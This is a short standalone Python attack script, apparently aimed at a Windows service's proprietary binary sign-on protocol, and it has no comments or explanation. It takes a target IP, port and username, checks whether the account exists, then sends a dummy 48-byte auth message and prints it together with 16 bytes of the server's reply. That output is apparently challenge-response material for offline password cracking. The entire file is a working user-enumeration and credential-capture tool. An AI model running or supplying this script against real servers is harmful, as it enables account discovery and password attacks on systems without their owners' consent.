import socket
import sys
import re
import struct
import binascii

if __name__=='__main__':
    if len(sys.argv) != 4:
        print("Usage: %s ip port username" % sys.argv[0])
        sys.exit(1)
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))

    Identity = b"\x00\x04\x1D\xA5"
    s.send(Identity)
    IdentifyResp = s.recv(1024)
    
    funcMap  = b"DCF7FACFFFE400000000000000000000"
    platform = b"WinNT"
    language = b"dscenu.txt"
    username = sys.argv[3].rstrip().upper().encode()
    
    SignOn = b"\x1A\xA5\x67\x00\x00\x00\x05\x07\x01\x00\x05"+struct.pack('!H',len(username))+struct.pack('!H',len(platform)+len(username))+b"\x00\x00\x01"+struct.pack('!H',len(platform)+len(username))+struct.pack('!H',len(language))+b"\x2A\x3F"+binascii.unhexlify(funcMap)+platform+username+language
    SignOn = struct.pack('!H',len(SignOn)+2)+SignOn
    
    s.send(SignOn)
    SignOnResp = s.recv(1024)
    if chr(SignOnResp[8]) != '\x00':
        print("user doesn't exist!")
        sys.exit()
        
    authMsg = b"\x41" * 48
    SignOnAuth = b"\x16\xA5\x00\x00"+struct.pack('!H',len(authMsg))+authMsg
    SignOnAuth = struct.pack('!H',len(SignOnAuth)+2)+SignOnAuth
    s.send(SignOnAuth)
    SignOnAuthResp = s.recv(1024)
    
    print("msg1: %s" % binascii.hexlify(authMsg).decode())
    print("msg2: %s" % binascii.hexlify(SignOnAuthResp[8:8+16]).decode())
    
    s.close()

    